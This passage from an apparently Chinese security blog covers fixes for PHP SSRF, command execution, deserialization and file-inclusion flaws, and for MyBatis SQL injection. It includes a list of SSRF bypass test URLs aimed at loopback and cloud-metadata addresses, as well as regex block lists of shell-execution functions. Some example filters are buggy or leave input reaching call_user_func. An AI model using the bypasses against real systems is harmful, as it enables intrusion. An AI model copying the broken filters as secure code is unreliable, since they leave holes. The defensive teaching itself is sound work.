class="variable">$res</span> = <span class="title function_ invoke__">CURL_EXEC</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>,CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.如果有跳转，获取跳转URL执行1, 否则返回响应</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">300</span>&lt;=<span class="variable">$code</span> <span class="keyword">and</span> <span class="variable">$code</span>&lt;<span class="number">400</span>)&#123;</span><br><span class="line">            <span class="variable">$headers</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="variable">$url</span>=<span class="variable">$headers</span>[<span class="string">&quot;redirect_url&quot;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">CURL_CLOSE</span>(<span class="variable">$ch</span>) ;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="comment">// $url=&quot;http://localhost:8888/302.php&quot;;</span></span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">safe_request</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*  判断是否合法的URL，合法则返回true</span></span><br><span class="line"><span class="comment">*  不合法的情况：</span></span><br><span class="line"><span class="comment">*  1. 包含非ASCII码字符</span></span><br><span class="line"><span class="comment">*  2. 不是http或https协议</span></span><br><span class="line"><span class="comment">*  3. ipv6地址（不支持ipv6地址，将判断为不合法）</span></span><br><span class="line"><span class="comment">*  4. URL的user、pass、host，fragment段包含@、\或其它字符</span></span><br><span class="line"><span class="comment">*  5. 请求地址为内网IP：192.168.0.0/16，10.0.0.0/8，172.16.0.0/12，127.0.0.1/8</span></span><br><span class="line"><span class="comment">*  6. 请求地址为169.254.169.254，100.100.100.200，192.0.0.192这几个常见云主机metadata地址ip</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*  注意，该方法未考虑到：</span></span><br><span class="line"><span class="comment">*  1. 30X跳转的location响应头部是否为合法URL</span></span><br><span class="line"><span class="comment">*  2. DNS Rebinding攻击</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*  <span class="doctag">@author</span> Ovie</span></span><br><span class="line"><span class="comment">*  <span class="doctag">@param</span> string $url</span></span><br><span class="line"><span class="comment">*  <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_allowed_URL</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Only allow ASCII URL (so will forbid CRLF and other Unicode char)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$url</span> || !<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only allow http and https scheme</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/.*$/&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;pass&quot;</span>, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;fragment&quot;</span>) <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parts</span>[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;~[:/?#\\\\@]~&quot;</span>, <span class="variable">$parts</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gethostbyname do not support ipv6</span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ip</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$is_inner_ipaddress</span> = <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">24</span> ||</span><br><span class="line">    <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">24</span> ||</span><br><span class="line">    <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="number">20</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">20</span> ||</span><br><span class="line">    <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="number">16</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">16</span> ||</span><br><span class="line">    <span class="variable">$ip</span> == <span class="number">0</span> ||</span><br><span class="line">    <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;169.254.169.254&#x27;</span>) == <span class="variable">$ip</span> ||</span><br><span class="line">    <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.0.0.192&#x27;</span>) == <span class="variable">$ip</span> ||</span><br><span class="line">    <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;100.100.100.200&#x27;</span>) == <span class="variable">$ip</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_inner_ipaddress</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if(isset($_GET[&#x27;url&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">    $url = $_GET[&#x27;url&#x27;];</span></span><br><span class="line"><span class="comment">    var_dump(is_allowed_URL($url));</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">is_allowed_URL</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$url</span> . <span class="string">&quot; : &quot;</span> . (<span class="variable">$res</span> ? <span class="variable">$res</span> : <span class="string">&quot;false&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.0.0.1:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://169.254.169.254:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://192.0.0.192:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://100.100.100.200:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.0.0.1:8080\@baidu.com/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://baidu.com#@127.0.0.1:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.1:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.0.0.1.:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://2130706433:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://0:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://[::]:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://localhost:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://0:0:0:0:0:ffff:127.0.0.1:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.0000.000000.000001:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.0.0.1:8080#@baidu.com/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;http://[::1]/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://0.0.0.0:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.2.0.2:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://0x7f.0x0.0x0.0x1:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://baidu.com.127.0.0.1.nip.io:8080/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://baidu.com@127.0.0.1:8080@baidu.com/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.0.0.1:8080\.baidu.com/ppppp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="string">&quot;https://127.0.0.1:8080:443/ppppp&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>python：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> inet_aton</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ssrf</span>(<span class="params">url</span>):</span><br><span class="line">    hostname = urlparse(url).hostname</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ip2long</span>(<span class="params">ip_addr</span>):</span><br><span class="line">        <span class="keyword">return</span> unpack(<span class="string">&quot;!L&quot;</span>, inet_aton(ip_addr))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_inner_ipaddress</span>(<span class="params">ip</span>):</span><br><span class="line">        ip = ip2long(ip)</span><br><span class="line">        <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span> \</span><br><span class="line">                ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span> \</span><br><span class="line">                ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="number">20</span> == ip &gt;&gt; <span class="number">20</span> <span class="keyword">or</span> \</span><br><span class="line">                ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="number">16</span> == ip &gt;&gt; <span class="number">16</span> \</span><br><span class="line">                ip2long(<span class="string">&#x27;0.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == ip &gt;&gt; <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^https?://.*/.*$&quot;</span>, url):</span><br><span class="line">            <span class="keyword">raise</span> BaseException(<span class="string">&quot;url format error&quot;</span>)</span><br><span class="line">        ip_address = socket.getaddrinfo(hostname, <span class="string">&#x27;http&#x27;</span>)[<span class="number">0</span>][<span class="number">4</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> is_inner_ipaddress(ip_address):</span><br><span class="line">            <span class="keyword">raise</span> BaseException(<span class="string">&quot;inner ip address attack&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;unknow error&quot;</span></span><br></pre></td></tr></table></figure>
<h4><span id="rce"> rce</span></h4>
<p>一些命令执行函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 代码执行函数 eval()、assert()、call_user_func()、call_user_func_array()、array_map()、exec()、shell_exec()等 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不常见的:</span></span><br><span class="line"><span class="comment">#create_function()、array_walk()、array_map()、array_filter()、array_reduce()、array_diff_ukey/array_diff_uassoc()、usort()、ob_start()、header_register_callback(&#x27;phpinfo&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prtnl_exec()、popen()、proc_open()...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#escapeshellarg() + escapeshellcmd()连用导致的问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则处理 mixed preg_replace ( mixed $ pattern , mixed $ replacement , mixed $ subject [, int $ limit = -1 [, int &amp;$ count ]] ) </span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>() 参数/e修饰符问题 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数过滤不严 call_user_func()和array_map()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修复方式：</p>
<ul>
<li>waf:</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>]; </span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;eval|assert|passthru|pcntl_exec|exec|system|escapeshellcmd|popen|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|ob_start&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$pattern</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$cc</span>)== <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$bb</span>=<span class="string">&quot;phpinfo()&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$cc</span>,<span class="variable">$bb</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wafrce</span>(<span class="params">$str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_">preg_match</span>(<span class="string">&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|phpinfo|file_put_contents\(\.\*\$|base64_decode\(/i&quot;</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">const</span> blacklists = [<span class="string">&quot;, \\, |, &amp;, +, -, *, /, ^];</span></span><br><span class="line"><span class="string">    const blackwords = [`select`, `drop`, `insert`, `update`, `delete`, `like`, `order`, `truncate`, `create`, `reg`, `sub`, `left`, `right`, `mid`, `if`, `log`, `pro`, `func`, `history`, `file`, `plugin`, `role`, `collation`, `event`];</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>修补preg_replace的时候需要将修饰符<code>/e</code>去掉</p>
</li>
<li>
<p>php7下，preg_replace不再适用<code>\e</code>，而应当使用<code>preg_replace_callback()</code></p>
</li>
<li>
<p>php.ini中设置disable_function</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=call_user_func,call_user_func_array,array_map,array_filter,ob_start,phpinfo,eval,assert,passthru,pcntl_exec,exec,system,escapeshellcmd,popen,chroot,scandir,chgrp,chown,shell_exec</span><br></pre></td></tr></table></figure>
<h4><span id="反序列化"> 反序列化</span></h4>
<ul>
<li>php7，为<code>unserialize()</code>函数提供了过滤，这个特性可以提供更加安全的过滤方式</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//将所有的对象都转换为__PHP_Incomplete_Class对象</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$foo</span>, [<span class="string">&quot;allowed_classes&quot;</span> =&gt; <span class="literal">false</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将除MyClass和MyClass2之外的所有对象都转化为__PHP_Incomplete_Class对象</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$foo</span>, [<span class="string">&quot;allowed_classes&quot;</span> =&gt; [<span class="string">&quot;MyClass&quot;</span>, <span class="string">&quot;MyClass2&quot;</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认情况下，无第二个参数，或者设置为了true</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$foo</span>, [<span class="string">&quot;allowed_classes&quot;</span> =&gt; <span class="literal">true</span>]);</span><br></pre></td></tr></table></figure>
<ul>
<li>限制session反序列化</li>
</ul>
<p>php_serialize 在5.5版本后新加的一种规则，5.4及之前版本，如果设置成php_serialize会报错。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">#二者处理session的方式不同，错误的使用会形成基于session的反序列化漏洞</span></span><br></pre></td></tr></table></figure>
<ul>
<li>限制phar：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;phar|zip|compress.bzip2|compress.zlib&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$filter</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$name</span>)== <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>php.ini设置禁用函数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=fileatime,filectime,file_exists,file_get_contents,file_put_content,filegroup,fileinode,filemtime,fileowner,fileperms,is_dir,is_executable,is_file,is_link,is_readable,is_writable,is_writeable,fopen,readfile,unlink,parse_ini_file,file,copy,stat,serialize,unserialize,__construct,__destruct,__toString,__sleep,__wakeup,__get,__set,__isset,__unset,__invoke</span><br></pre></td></tr></table></figure>
<h4><span id="文件包含"> 文件包含</span></h4>
<p>小waf：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/|\.\.\/|\.\/|etc|var|php|jpg|jpeg|png|bmp|gif&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$pattern</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$filename</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;die&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>大waf(协议过滤+路径 访问控制)：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/|\.\.\/|\.\/|etc|var|php|jpg|jpeg|png|bmp|gif|file|http|ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect|zip|compress|filter|input&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$pattern</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$filename</span>)== <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;die00000000000000000000000000000&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>php.ini</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = off  （是否允许打开远程文件）  </span><br><span class="line">allow_url_include = off（是否允许include/require远程文件）</span><br></pre></td></tr></table></figure>
<ul>
<li>open_basedir</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir=&quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure>
<h3><span id="java"> java</span></h3>
<h4><span id="sql注入"> sql注入</span></h4>
<ul>
<li><code>MyBatis</code>框架：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">if</span> test=<span class="string">&quot;outtype !=null and outtype !=&#x27;&#x27;&quot;</span>&gt;</span><br><span class="line">			 AND u.catelog_name = <span class="string">&#x27;$&#123;outtype&#125;&#x27;</span></span><br><span class="line">		&lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">		&lt;<span class="keyword">if</span> test=<span class="string">&quot;baseKey !=null and baseKey !=&#x27;&#x27;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>将<code>$</code>改为<code>#</code></p>
